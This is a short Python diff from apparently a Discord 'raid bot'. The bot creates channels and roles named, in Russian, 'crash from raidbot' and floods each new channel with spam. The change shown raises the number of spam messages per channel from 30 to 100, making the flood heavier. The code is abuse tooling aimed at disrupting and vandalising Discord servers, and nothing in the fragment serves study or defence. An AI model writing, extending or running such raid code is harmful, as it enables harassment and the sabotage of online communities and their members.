@@ -26,7 +26,7 @@ async def sendch(ch,text,count):
 async def createchannel(ctx):
     try: c = await ctx.guild.create_text_channel('краш от рейдбата')
     except: pass
-    else: create_task(sendch(ch=c,text=spamtext,count=30))
+    else: create_task(sendch(ch=c,text=spamtext,count=100))
 
 async def createrole(ctx):
     try: await ctx.guild.create_role(name='краш от рейдбата')
